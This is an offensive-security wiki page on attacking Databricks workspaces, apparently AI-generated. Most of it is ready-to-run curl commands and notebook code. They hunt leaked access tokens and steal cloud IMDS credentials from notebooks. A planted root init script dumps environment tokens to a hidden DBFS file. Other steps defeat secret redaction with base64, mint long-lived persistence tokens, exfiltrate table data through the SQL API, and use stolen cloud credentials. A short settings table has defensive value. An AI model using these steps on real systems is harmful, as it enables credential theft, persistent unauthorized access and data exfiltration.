# Databricks

#Databricks #Azure #AWS #cloud #dataengineering #enterprise #notebooks

## What is Databricks?

Unified analytics platform built on Apache Spark — deployed as a managed service on Azure, AWS, or GCP. Widely used in enterprise data engineering and ML pipelines. Attack surface: Personal Access Tokens (PATs) and OAuth service-principal secrets with excessive privileges, notebook code execution reaching cloud metadata services, DBFS sensitive data, misconfigured cluster policies, init-script abuse, and secret-scope misconfigurations.

- **Azure**: `https://<workspace>.azuredatabricks.net`
- **AWS**: `https://<workspace>.cloud.databricks.com`
- **GCP**: `https://<workspace>.<region>.gcp.databricks.com`
- **REST API base**: `https://<workspace>/api/2.0/`
- **Account console** (broader than a single workspace): `https://accounts.cloud.databricks.com` (AWS) / `https://accounts.azuredatabricks.net` (Azure)
- **Port**: TCP 443 (HTTPS only — SaaS)

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/File Transfer/cURL\|cURL]] | Raw REST API interaction (all `/api/2.0/` calls below) |
| [[Tools/Cloud/databricks-cli\|databricks CLI]] | Official client — wraps the same API; reads `~/.databrickscfg` / `DATABRICKS_TOKEN` |
| [[Tools/Cloud/aws-cli\|AWS CLI]] | Use IAM role creds stolen from cluster IMDS (post-exploitation) |
| [[Tools/Cloud/Pacu\|Pacu]] | Deeper AWS enumeration/privesc once you have cloud creds from a cluster |
| [[Tools/Cloud/ScoutSuite\|ScoutSuite]] | Multi-cloud config audit once you pivot into the underlying cloud account |

---

## Connect / Access

Databricks is an authenticated REST API — you need a credential before any enumeration. Two credential types matter.

### Personal Access Token (PAT)

```bash
# PAT format: dapi<32_hex_chars>
# Generate in UI: User Settings → Access Tokens → Generate New Token

# Test token validity
curl -s https://<workspace>/api/2.0/clusters/list \
  -H "Authorization: Bearer <PAT>"

# Identify who the token belongs to
curl -s https://<workspace>/api/2.0/preview/scim/v2/Me \
  -H "Authorization: Bearer <PAT>"
```

**Where to hunt for PATs:**
- Git repos (GitHub/GitLab search for `dapi` + 32 hex chars) — dork: `"dapi" site:github.com`
- CI/CD pipeline configs (GitHub Actions / Azure DevOps secret leaks)
- Notebook/Jupyter files checked into git, `.env` / config files
- Azure Key Vault (if accessible)
- Postman collections, Swagger files
- A compromised host's `~/.databrickscfg` or `DATABRICKS_TOKEN` env var

### OAuth Service Principal (M2M)

Modern non-interactive auth (replacing PATs in many workspaces) uses OAuth 2.0 client credentials. A leaked service-principal `client_id` + `client_secret` is as good as a PAT — often better, since SPs frequently hold admin or broad Unity Catalog grants.

```bash
# Exchange client_id/client_secret for a short-lived OAuth token
curl -s -X POST https://<workspace>/oidc/v1/token \
  -u "<client_id>:<client_secret>" \
  -d "grant_type=client_credentials&scope=all-apis"
# Returns access_token — use exactly like a PAT: Authorization: Bearer <access_token>

# Account-level token endpoint (account console, broader scope)
curl -s -X POST https://accounts.cloud.databricks.com/oidc/accounts/<account_id>/v1/token \
  -u "<client_id>:<client_secret>" \
  -d "grant_type=client_credentials&scope=all-apis"
```

> [!note]
> OAuth SP secrets turn up in the same places as PATs (CI configs, Terraform state, `~/.databrickscfg` with `[profile]` OAuth blocks). Service-principal identities also can't be tied to a leaving employee, which is why they're a favored persistence foothold — see the token-creation persistence technique below.

---

## Enumeration

```bash
# Clusters
curl -s https://<workspace>/api/2.0/clusters/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# Notebooks / workspace files
curl -s "https://<workspace>/api/2.0/workspace/list?path=/" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# Jobs
curl -s https://<workspace>/api/2.0/jobs/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# DBFS contents
curl -s "https://<workspace>/api/2.0/dbfs/list?path=/" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# Secret scopes + secret names (values not returned, but names reveal what's stored)
curl -s https://<workspace>/api/2.0/secrets/scopes/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
curl -s "https://<workspace>/api/2.0/secrets/list?scope=<scope_name>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool

# Users / groups (SCIM)
curl -s https://<workspace>/api/2.0/preview/scim/v2/Users \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
curl -s https://<workspace>/api/2.0/preview/scim/v2/Groups \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
```

### Account-Console Enumeration (broader than one workspace)

Account admin outranks workspace admin — it can enumerate every workspace, all account-level SCIM users/groups, and metastore assignments. If your token/SP has account access, start here.

```bash
# List all workspaces under the account
curl -s https://accounts.cloud.databricks.com/api/2.0/accounts/<account_id>/workspaces \
  -H "Authorization: Bearer <account_token>" | python3 -m json.tool

# Account-level users and service principals
curl -s https://accounts.cloud.databricks.com/api/2.0/accounts/<account_id>/scim/v2/Users \
  -H "Authorization: Bearer <account_token>" | python3 -m json.tool
curl -s https://accounts.cloud.databricks.com/api/2.0/accounts/<account_id>/scim/v2/ServicePrincipals \
  -H "Authorization: Bearer <account_token>" | python3 -m json.tool
```

---

## Attack Vectors

### Notebook Code Execution → Cloud Metadata

Any notebook cell gives OS-level access as the cluster service account. In cloud environments, this reaches the instance metadata service (IMDS) — leaking cloud credentials.

```python
# In a Databricks notebook cell:

# OS commands
import subprocess
result = subprocess.run(['id'], capture_output=True, text=True)
print(result.stdout)

# --- Azure IMDS — steal managed identity token ---
import requests
url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
headers = {"Metadata": "true"}
print(requests.get(url, headers=headers).json())

# OAuth token for Azure resources (Storage, Key Vault, ARM, etc.)
token_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
print(requests.get(token_url, headers={"Metadata": "true"}).json()['access_token'])

# --- AWS IMDS — steal IAM role credentials ---
role = requests.get("http://169.254.169.254/latest/meta-data/iam/security-credentials/").text
creds = requests.get(f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}").json()
print(creds['AccessKeyId'], creds['SecretAccessKey'], creds['Token'])

# --- GCP Metadata ---
headers = {"Metadata-Flavor": "Google"}
sa_token = requests.get(
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
  headers=headers
).json()
print(sa_token['access_token'])
```

### Init Script Abuse — Cluster Isolation Bypass & Persistence

Cluster **init scripts** run as root on every node at cluster startup — before any user isolation applies. Historically (SEC Consult, 2023) legacy *global* init scripts lived at a world-writable DBFS path (`dbfs:/databricks/init`), letting any low-privileged user who could run a notebook overwrite them and gain code execution as root across every cluster in the workspace — escalating to workspace admin and stealing all secrets/admin tokens.

**Conditions:** ability to run notebooks + write access to an init-script location (DBFS, a workspace file, or cluster config). Legacy global + cluster-named init scripts were disabled platform-wide on **Sept 1, 2023** — but **cluster-scoped / workspace-file init scripts remain a valid code-exec and persistence vector** where you can influence them.

```bash
# Enumerate init scripts referenced by clusters (look for DBFS/workspace paths you can write)
curl -s "https://<workspace>/api/2.0/clusters/get?cluster_id=<id>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool | grep -A3 init_scripts
```

```python
# In a notebook — plant/modify a cluster-scoped init script on DBFS
payload = '''#!/bin/bash
# runs as root on cluster start — exfil the workspace admin token / secrets, or add persistence
env | grep -i token >> /dbfs/FileStore/.cache/.x
'''
dbutils.fs.put("dbfs:/databricks/scripts/legit-looking-init.sh", payload, overwrite=True)
# Attach it to a cluster's init_scripts config (via clusters/edit) — executes as root next start
```

> [!warning]
> Init scripts are a top persistence spot: a script referenced by an autoscaling/always-on cluster re-executes on every node spin-up. Audit `cluster/get` init_scripts and global-init-script APIs when hunting for existing backdoors.

### Read Secrets from Notebooks / DBFS

```bash
# Export notebook content (Base64) — hunt for hardcoded creds
curl -s "https://<workspace>/api/2.0/workspace/export?path=/Users/<user>/notebook&format=SOURCE" \
  -H "Authorization: Bearer <PAT>" | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['content']).decode())"

# Read a DBFS file (Base64) — data exports, configs, credentials
curl -s "https://<workspace>/api/2.0/dbfs/read?path=/FileStore/config.json&length=1000000" \
  -H "Authorization: Bearer <PAT>" | python3 -c "import sys,json,base64; d=json.load(sys.stdin); print(base64.b64decode(d['data']).decode())"
```

### Secret Scope Misconfigurations

```python
# Secret VALUES can't be pulled via API — but a notebook with scope access can read them:
dbutils.secrets.list(scope="<scope_name>")
secret_val = dbutils.secrets.get(scope="<scope_name>", key="<key_name>")
# Databricks redacts secrets in cell output — defeat redaction by re-encoding:
import base64
print(base64.b64encode(secret_val.encode()).decode())
```

### Job / Cluster Config — Credential Extraction

```bash
# Job configs often embed spark.hadoop creds, S3 keys, JDBC passwords
curl -s "https://<workspace>/api/2.0/jobs/get?job_id=<id>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool | \
  grep -i "password\|secret\|key\|token\|jdbc\|storage"

# Cluster configs — spark_conf / env_vars with fs.s3a.access.key, fs.azure creds
curl -s "https://<workspace>/api/2.0/clusters/get?cluster_id=<id>" \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool | \
  grep -A2 -i "spark_conf\|env_vars\|password\|key\|secret"
```

### Generate / Steal PAT via Compromised Session (Persistence)

```bash
# With any valid session/token — mint a new long-lived PAT for persistence
curl -s -X POST https://<workspace>/api/2.0/token/create \
  -H "Authorization: Bearer <existing_PAT>" \
  -H "Content-Type: application/json" \
  -d '{"comment":"backup","lifetime_seconds":2592000}'

# Enumerate existing tokens (spot admin tokens)
curl -s https://<workspace>/api/2.0/token/list \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
```

> [!note]
> Stealthier persistence: create an **OAuth secret on a service principal** you control (or an existing admin SP) — SP secrets aren't tied to a user account and survive employee offboarding reviews.

### Unity Catalog / Data Access

```bash
# Enumerate the data plane
curl -s https://<workspace>/api/2.1/unity-catalog/catalogs \
  -H "Authorization: Bearer <PAT>" | python3 -m json.tool
curl -s "https://<workspace>/api/2.1/unity-catalog/schemas?catalog_name=<catalog>" \
  -H "Authorization: Bearer <PAT>"
curl -s "https://<workspace>/api/2.1/unity-catalog/tables?catalog_name=<catalog>&schema_name=<schema>" \
  -H "Authorization: Bearer <PAT>"

# Exfil actual data via the SQL Statement API
curl -s -X POST https://<workspace>/api/2.0/sql/statements \
  -H "Authorization: Bearer <PAT>" \
  -H "Content-Type: application/json" \
  -d '{"warehouse_id":"<warehouse_id>","statement":"SELECT * FROM <catalog>.<schema>.<table> LIMIT 100","wait_timeout":"30s"}'
```

---

## Post-Exploitation

```bash
# --- Stolen Azure managed-identity token → Azure resources ---
access_token="<stolen_token>"
curl -s "https://management.azure.com/subscriptions?api-version=2020-01-01" \
  -H "Authorization: Bearer $access_token"
curl -s "https://<keyvault>.vault.azure.net/secrets?api-version=7.3" \
  -H "Authorization: Bearer $access_token"

# --- Stolen AWS IAM role creds → AWS account (see Tools/Cloud/aws-cli) ---
export AWS_ACCESS_KEY_ID="<AccessKeyId>"
export AWS_SECRET_ACCESS_KEY="<SecretAccessKey>"
export AWS_SESSION_TOKEN="<Token>"
aws sts get-caller-identity
aws s3 ls
aws secretsmanager list-secrets
```

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| PAT or OAuth SP with admin permissions | Full workspace (or account) control |
| Cluster with no isolation / shared access mode | Notebook code reaches IMDS → cloud creds; cross-user code exec |
| Writable cluster-scoped / global init scripts | Root code exec on cluster start → privesc + persistence (SEC Consult 2023) |
| Hardcoded secrets in notebooks / job / cluster configs | Source-visible credential leak |
| Overly permissive secret scope ACLs | Any user reads all secrets in scope |
| Workspace-level ACLs instead of Unity Catalog | Broad, ungoverned data access |
| No IP access list configured | PAT/OAuth token usable from any IP |
| Long-lived PATs (no expiry) / unrotated SP secrets | Persistent access after compromise |
| Unpatched Azure Databricks (CVE-2025-53763) | Improper access control → network privilege escalation |
| Unpatched Azure Databricks (CVE-2026-33107) | SSRF → unauthorized requests / privilege escalation |

---

## Quick Reference

| Goal | Command |
|---|---|
| Test PAT | `curl -s https://workspace/api/2.0/clusters/list -H "Authorization: Bearer <PAT>"` |
| OAuth SP token | `curl -s -X POST https://workspace/oidc/v1/token -u "<id>:<secret>" -d "grant_type=client_credentials&scope=all-apis"` |
| Whoami | `curl ... /api/2.0/preview/scim/v2/Me` |
| List workspaces (account) | `curl ... accounts.cloud.databricks.com/api/2.0/accounts/<id>/workspaces` |
| Export notebook | `curl ... /api/2.0/workspace/export?path=<path>&format=SOURCE` |
| Read secret (notebook) | `dbutils.secrets.get(scope="<scope>", key="<key>")` |
| Azure IMDS token | `curl http://169.254.169.254/metadata/identity/oauth2/token?...` |
| AWS IMDS creds | `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` |
| Plant init script | `dbutils.fs.put("dbfs:/databricks/scripts/x.sh", payload, overwrite=True)` |
| Mint persistence PAT | `POST /api/2.0/token/create` |
| Run SQL / exfil data | `POST /api/2.0/sql/statements` with warehouse_id + statement |

---

*Created: 2026-07-28*
*Updated: 2026-07-28*
*Model: claude-opus-4-8*
